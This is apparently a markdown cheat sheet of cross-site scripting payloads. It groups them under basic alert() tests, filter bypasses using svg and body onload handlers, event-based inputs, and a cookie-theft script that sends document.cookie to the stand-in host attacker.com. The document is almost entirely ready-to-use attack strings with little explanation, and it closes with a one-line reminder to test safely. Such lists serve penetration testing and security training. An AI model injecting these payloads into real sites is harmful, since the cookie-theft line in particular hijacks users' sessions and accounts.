# 💣 XSS Payloads

## 🔰 Basic Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

## 🔓 Bypass Filters

```html
<svg onload=alert(1)>
<body onload=alert(1)>
```

---

## 🍪 Cookie Theft

```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

---

## 🔄 Event-Based Payloads

```html
<input onfocus=alert(1)>
<button onclick=alert(1)>Click</button>
```

---

## ⚠️ Notes
- Payloads vary based on filters
- Always test in safe environments
